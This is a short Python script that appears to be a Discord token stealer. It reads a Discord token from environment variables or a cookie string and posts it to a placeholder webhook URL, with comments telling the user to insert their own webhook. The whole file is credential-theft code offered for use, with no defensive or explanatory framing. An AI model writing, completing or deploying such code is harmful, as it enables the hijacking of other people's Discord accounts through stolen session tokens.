import os
import requests
import json

def get_discord_token():
    # Replace this with your webhook URL
    webhook_url = 'YOUR_WEBHOOK_URL'

    # Function to send the token to the webhook
    def send_token(token):
        payload = {
            "content": f"Discord Token: {token}"
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        if response.status_code == 204:
            print("Token sent successfully!")
        else:
            print("Failed to send token.")

    # Function to get the Discord token from local storage
    def get_token_from_local_storage():
        token = os.getenv('DISCORD_TOKEN')
        if token:
            send_token(token)
        else:
            print('No Discord token found in local storage.')

    # Function to get the Discord token from cookies
    def get_token_from_cookies():
        cookies = os.getenv('COOKIES')
        if cookies:
            token = cookies.split(';')[0].split('=')[1]
            if token:
                send_token(token)
            else:
                print('No Discord token found in cookies.')
        else:
            print('No cookies found.')

    # Try to get the token from local storage first
    get_token_from_local_storage()

    # If not found, try to get the token from cookies
    get_token_from_cookies()

if __name__ == "__main__":
    get_discord_token()
